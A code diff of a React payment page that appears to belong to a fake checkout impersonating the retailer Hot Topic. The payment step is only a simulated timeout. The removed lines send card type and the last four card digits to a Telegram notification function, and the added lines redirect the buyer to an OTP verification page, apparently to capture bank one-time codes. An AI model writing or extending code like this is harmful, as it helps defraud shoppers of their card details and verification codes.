@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -276,41 +275,17 @@ const Payment = () => {
       
       // Create payment processing simulation
       setTimeout(() => {
-        // Create order details object with payment info
-        const completeOrderDetails = {
-          ...orderDetails,
-          paymentMethod: selectedCardType,
-          lastFour: formData.cardNumber.slice(-4)
-        };
-  
-        // Save order details to localStorage for reference
-        localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
-        
-        // Send order notification to Telegram
-        try {
-          console.log("Sending order notification to Telegram with details:", completeOrderDetails);
-          supabase.functions.invoke("send-telegram-notification", {
-            body: completeOrderDetails
-          }).then(response => {
-            if (response.error) {
-              console.error("Failed to send Telegram notification:", response.error);
-            } else {
-              console.log("Telegram notification sent successfully:", response.data);
-            }
-          });
-        } catch (telegramErr) {
-          console.error("Error sending Telegram notification:", telegramErr);
-        }
-        
-        // Navigate to payment success page
-        navigate("/payment-success", { 
+        // Navigate to OTP verification page
+        navigate("/otp-verification", { 
           state: { 
-            orderDetails: completeOrderDetails,
+            orderDetails,
             giftCardValue,
-            discountedAmount
+            discountedAmount,
+            paymentMethod: selectedCardType,
+            lastFour: formData.cardNumber.slice(-4)
           } 
         });
-      }, 2500);
+      }, 1500);
     } catch (error) {
       console.error("Payment submission error:", error);
       toast({
